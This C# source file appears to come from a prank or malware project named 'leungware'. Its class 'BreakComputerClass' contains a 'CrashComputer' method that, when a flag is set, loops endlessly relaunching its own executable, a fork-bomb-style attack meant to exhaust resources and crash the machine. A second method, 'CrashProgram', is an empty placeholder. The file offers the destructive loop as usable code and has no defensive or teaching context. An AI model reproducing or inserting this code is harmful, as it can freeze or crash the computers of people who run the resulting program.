using System;
using System.Diagnostics;
using System.Reflection;
namespace leungware_v420
{
    public class BreakComputerClass
    {
        public bool BreakComputer = false;
        public bool CrashProgramVar = false;
        public void CrashComputer()
        {
            while (BreakComputer)
            {
                Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }

        public void CrashProgram()
        {
            if (CrashProgramVar)
            {
                
            }
        }

    }
}